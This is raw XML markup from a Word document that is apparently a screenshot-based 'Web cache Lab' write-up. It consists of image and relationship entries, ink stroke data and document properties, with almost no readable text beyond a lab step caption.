          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EB9E9D2" wp14:editId="0C5F87E0">
            <wp:extent cx="5486400" cy="2810510"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="4328166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16697" name="Picture 432816697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68E2" w14:textId="77777777" w:rsidR="00774B8C" w:rsidRDefault="00774B8C"/>
    <w:p w14:paraId="16F405CF" w14:textId="77777777" w:rsidR="00774B8C" w:rsidRDefault="00774B8C"/>
    <w:p w14:paraId="638416C5" w14:textId="71BDB29D" w:rsidR="00774B8C" w:rsidRDefault="0089725D">
      <w:r w:rsidRPr="0089725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Step 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8</w:t>
      </w:r>
      <w:r w:rsidRPr="0089725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 -</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> API of Carlo appear Submit your Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59457A23" w14:textId="0825E3CC" w:rsidR="00774B8C" w:rsidRDefault="00774B8C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30A0BF95" wp14:editId="765045EA">
            <wp:extent cx="5486400" cy="2943225"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="8639507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50740" name="Picture 86395074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B8C" w:rsidSect="00034616">
      <w:headerReference w:type="default" r:id="rId5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D5728" w14:textId="77777777" w:rsidR="006806E4" w:rsidRDefault="006806E4" w:rsidP="00944003">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="4AE63EF0" w14:textId="77777777" w:rsidR="006806E4" w:rsidRDefault="006806E4" w:rsidP="00944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A7031" w14:textId="77777777" w:rsidR="006806E4" w:rsidRDefault="006806E4" w:rsidP="00944003">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="24449323" w14:textId="77777777" w:rsidR="006806E4" w:rsidRDefault="006806E4" w:rsidP="00944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4AF7F" w14:textId="713CE9F8" w:rsidR="00944003" w:rsidRPr="00944003" w:rsidRDefault="00944003">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
      <w:t xml:space="preserve">                        </w:t>
    </w:r>
    <w:r w:rsidRPr="00944003">
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
      <w:t xml:space="preserve">Web cache Lab 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B27A55"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B098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57A5E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="67E0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0246E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8EE6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072575">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="683822602">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1225489959">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="94596363">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1643074897">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1278104276">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1022633148">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="823283529">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="331177477">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1542395684">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1947425533">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="13613155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F0A"/>
    <w:rsid w:val="000D12AE"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00337BC1"/>
    <w:rsid w:val="005731BA"/>
    <w:rsid w:val="005E606C"/>
    <w:rsid w:val="006806E4"/>
    <w:rsid w:val="006B6FAE"/>
    <w:rsid w:val="00774B8C"/>
    <w:rsid w:val="0089725D"/>
    <w:rsid w:val="009130AE"/>
    <w:rsid w:val="00944003"/>
    <w:rsid w:val="0095656B"/>
    <w:rsid w:val="00A829B6"/>
    <w:rsid w:val="00A8710E"/>
    <w:rsid w:val="00A87288"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BC52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8E1FD1"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{3D32F992-BB28-4F6B-903F-63EF22F0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829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9B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0F0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0F0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8.png"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink16.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink4.xml"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink19.xml"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink23.xml"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink25.xm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customXml" Target="ink/ink9.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.JPG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4.xml"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink17.xml"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink21.xml"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.JPG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19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink3.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink10.xml"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.JP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JPG"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink5.xml"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink8.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink12.xml"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink20.xml"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink24.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:aakashsinghrajput8610@gmail.com" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.JPG"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink2.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink7.xml"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink11.xml"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink15.xml"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink22.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink18.xml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ustomXml" Target="ink/ink1.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink6.xml"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ink/ink13.xml"/><Relationship Id="rId49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30.46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62,'5'0,"15"-5,9-1,4-3,0 0,-1 2,-6-1,-4 2,-4 1,-3 2,0 1,-1 1,-3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29.83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29.38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899 2,'-210'-2,"-220"5,247 18,107-12,633-10,-506-6,-51 7,1 0,-1 0,0 0,0 0,0 0,1 0,-1 0,0 0,0 0,1 0,-1 0,0 0,0 0,0 0,1 0,-1 0,0 0,0 0,0 0,1-1,-1 1,0 0,0 0,0 0,1 0,-1 0,0-1,0 1,0 0,0 0,0 0,1 0,-1-1,0 1,0 0,0 0,0 0,0-1,0 1,0 0,0 0,0-1,0 1,0 0,0-1,-27-1,-331 2,336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27.53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27.30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26.94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1 839,'108'-112,"-43"43,106-88,-155 147,0 0,0 2,1-1,0 2,1 0,26-6,-18 6,48-22,-57 22,2 0,31-8,8-2,-25 4,-1-2,-1-1,-1-1,0-2,-1-1,-1-1,42-40,11-30,-49 51,-27 35,0 1,1-1,-1 1,1 0,6-4,-3 3,0-2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06:24:24.63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1482 13 24450,'-1482'0'0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06:24:20.52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0 455 24575,'98'-2'0,"106"4"0,-183 0 0,0 2 0,22 5 0,27 6 0,144 21 0,-116-17 0,84 14 0,-128-27 0,-36-5 0,0 0 0,0 2 0,24 7 0,122 31 0,-136-34 0,0-1 0,0-2 0,1-1 0,-1-1 0,1-2 0,32-3 0,8 1 0,506 2 0,-544 2 0,1 1 0,-1 2 0,49 14 0,11 2 0,345 70 0,-305-73 0,2-4 0,168-6 0,-234-7 0,75-2 0,-92-7 0,20 0 0,-68 8 0,0 0 0,0 0 0,0 0 0,0 0 0,-1 0 0,1-1 0,0 1 0,0-1 0,0 1 0,-1-1 0,1 1 0,0-1 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1-1 0,1 1 0,-1 0 0,0-1 0,0 1 0,0-1 0,2-1 0,-3 0 0,1 0 0,0 1 0,-1-1 0,1 0 0,-1 0 0,0 0 0,0 1 0,0-1 0,0 0 0,-1 0 0,1 0 0,-1 1 0,0-1 0,1 0 0,-1 1 0,-2-5 0,-7-12 0,-1 0 0,0 1 0,-14-17 0,11 17 0,1-2 0,-14-26 0,5 2 0,14 31 0,0-1 0,2 0 0,0-1 0,0 0 0,-4-17 0,6 17 0,-1 1 0,-1 0 0,0 0 0,-1 0 0,-11-16 0,17 28 0,-2-2 0,0 0 0,0 0 0,0 0 0,1 0 0,-1-1 0,1 1 0,0-1 0,1 0 0,-1 1 0,1-1 0,0 0 0,0 0 0,1 0 0,-1 0 0,1 0 0,0 1 0,0-1 0,2-7 0,2-5 0,1 0 0,0 0 0,16-30 0,-14 31 0,0 0 0,-1-1 0,8-31 0,-14 47 0,1 0 0,-1 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 0 0,-1 0 0,1 0 0,0 0 0,-1 0 0,1 0 0,0 1 0,-1-1 0,1 0 0,-1 0 0,1 0 0,-1 0 0,0 1 0,1-1 0,-2-1 0,0 2 0,1-1 0,-1 0 0,1 1 0,-1-1 0,0 1 0,1-1 0,-1 1 0,0 0 0,0 0 0,1-1 0,-1 1 0,0 1 0,-2-1 0,-6 2 0,-1 0 0,1 0 0,-16 7 0,24-8 0,-50 22 0,1 1 0,-52 35 0,3-2 0,72-41 0,-5 2 0,-1 0 0,-1-2 0,0-2 0,-37 10 0,17-8 0,-77 34 0,104-38 0,-30 14 0,36-16 0,1 0 0,-1-2 0,-1 0 0,-30 6 0,41-11 0,1 0 0,-1 1 0,-17 8 0,22-8 0,-1 0 0,1-1 0,-1-1 0,0 1 0,0-1 0,0 0 0,0-1 0,-15 2 0,64-15 0,56-10 0,1 5 0,1 4 0,175 0 0,95 14 0,-368-1 0,0 0 0,1 0 0,-1 0 0,1 0 0,-1 0 0,1 0 0,-1 0 0,0 0 0,1-1 0,-1 1 0,1-1 0,-1 1 0,0-1 0,0 1 0,2-2 0,-3 2 0,0-1 0,0 1 0,0-1 0,0 1 0,-1-1 0,1 1 0,0-1 0,0 1 0,-1-1 0,1 1 0,0-1 0,-1 1 0,1 0 0,0-1 0,-1 1 0,1-1 0,0 1 0,-1 0 0,1 0 0,-1-1 0,1 1 0,-1 0 0,1 0 0,-1-1 0,0 1 0,-52-23 0,47 21 0,-260-84 0,93 33 0,-219-63 0,369 106-1365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06:24:15.00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31 24575,'252'-2'0,"262"5"0,-455 1 0,85 19 0,4 1 0,248 0 0,-294-23 0,-35 1 0,-1-3 0,88-13 0,285-58 0,-409 68 0,23-4 0,93-3 0,-89 12 0,0 2 0,66 12 0,214 31 0,-247-34 0,-42-5 0,72 2 0,466-10 0,-565 2 0,0 2 0,-1 0 0,1 1 0,34 13 0,15 2 0,189 48 0,-217-61 0,-1-2 0,0-2 0,71-6 0,-65 2 0,183-19 0,-133 10 0,43-10 0,23-1 0,158 7 0,-274 14 0,70-10 0,-80 8 0,0 1 0,47 4 0,44-3 0,-107-1 0,34-10 0,-38 7 0,0 1 0,1 1 0,21-1 0,24-5 0,-21 2 0,23-1 0,87-7 0,470 7 0,-367 10 0,-180-2 0,522-12 0,-353 9-91,-175 3-1183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06:24:09.65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18 24575,'793'0'0,"-601"-15"0,1009 13 0,-589 4 0,-584-4-1365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06:23:54.36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24567,'0'903'0,"16748"-903"0,-33496-903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25.63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25.38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23.68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23.45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23.28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22.92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22.11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21.878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21.52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1,'36'2,"0"1,67 16,8 1,74 12,-154-26,-18-3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20.92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20.678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20.46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20.13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1,'5'0,"10"0,7 0,2 0,3 0,1 0,-1 0,-2 0,-4 0,-2 0,-2 0,-1 0,-1 0,-1 0,1 0,-3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6:23:19.33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2,'104'-1,"112"3,-148 5,-38-3,37 0,-58-4,2-1,0 0,0 2,-1-1,1 1,0 1,0 0,0 1,-1 0,15 6,-12-4,1 1,-1-2,1 0,0-1,0 0,25 1,91-5,-55-1,-37 1,10 0,-45 1,-7 1,-27 3,13-3,-434 25,443-25,1 0,0 0,0 1,0 0,0 0,1 1,-1 0,0 0,-11 8,8-5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11</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-29T06:26:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>